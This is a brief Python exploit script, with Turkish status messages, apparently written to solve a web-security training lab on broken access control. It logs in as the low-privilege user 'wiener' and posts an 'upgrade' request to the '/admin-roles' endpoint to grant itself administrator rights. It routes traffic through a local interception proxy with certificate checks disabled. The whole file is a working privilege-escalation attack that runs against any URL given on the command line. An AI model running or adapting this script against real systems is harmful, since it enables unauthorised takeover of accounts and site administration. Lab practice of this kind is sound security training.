import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import re

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080' }



def upgrade_user(s,url):
     login_url = url+"/login"
     print("(+) Login wiener")
     data = {"username": "wiener",
            "password": "peter"}
    
     r = s.post(login_url, data=data, verify=False, proxies=proxies)
     res = r.text
     if "Log out" in res:
        print("[+] Giriş okey")
        upgrade_url = url + "/admin-roles"
        data_upgrade = {"action": "upgrade",
            "confirmed": "true", "username": "wiener"}
        r = s.post(upgrade_url, data=data_upgrade, verify=False, proxies=proxies)
        if r.status_code ==200:
            print("[+] yetki okey")
        else:
             print("[+] yetki okey değil")
             sys.exit(-1)



     else:
        print("[+] Giriş yok")
        sys.exit(-1)



if __name__ == "__main__":
    if len(sys.argv) !=2:
          print("(+) usage %s <url>" %sys.argv[0])
          print("(+) Example Url  %s www.example.com " %sys.argv[0])
          sys.exit(-1)
    
  
    s = requests.Session()
    url = sys.argv[1]
    print("[+] Admin panel arıyorum.......")
    upgrade_user(s, url)




